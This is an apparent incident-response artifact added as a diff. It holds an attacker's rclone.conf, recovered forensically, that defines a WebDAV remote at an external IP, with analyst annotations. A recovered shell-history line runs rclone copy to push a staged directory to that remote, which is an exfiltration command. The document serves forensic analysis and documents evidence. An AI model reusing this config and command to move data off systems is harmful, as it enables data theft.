@@ -1,0 +1,34 @@
+# ---------------------------------------------------------------------
+# rclone.conf — RECOVERED FROM UNALLOCATED SPACE
+#
+# Source:   C:\Windows\Temp\wu\rclone.conf (MFT entry marked InUse=False;
+#           the file was deleted at 2024-11-12 03:41:22 UTC together with
+#           the rest of the staging directory)
+# Method:   resident $DATA carved from the MFT record, cross-checked
+#           against the file-slack copy in unallocated clusters
+# Analyst:  IR-2024-ACCTFS01
+#
+# This is the highest-value single artifact in the exfiltration half of
+# the case: it names the transfer protocol, the endpoint and the remote
+# name that appears in the PowerShell 4104 command line.
+# ---------------------------------------------------------------------
+
+[vault-remote]
+type = webdav
+url = https://185.220.101.44:443/dav
+vendor = other
+user = acct
+pass = <obfuscated by rclone; reversible with rclone obscure -->
+pacer_min_sleep = 10ms
+
+# Recovered fragment of the shell history that used it:
+#   rclone.exe copy "C:\Windows\Temp\wu" vault-remote:acct \
+#     --config "C:\Windows\Temp\wu\rclone.conf" \
+#     --transfers 8 --multi-thread-streams 4 --ignore-existing -q
+#
+# NOTE THE ABSENCE OF --log-file. There is therefore no per-file record
+# of what was transferred. The staged set is known only at archive-volume
+# granularity (12 volumes, 36829344563 bytes total)
+# and at source-directory granularity from the 7-Zip command line in
+# powershell-evtx.csv. That gap is what keeps the exfiltration finding at
+# "highly likely" rather than "confirmed".
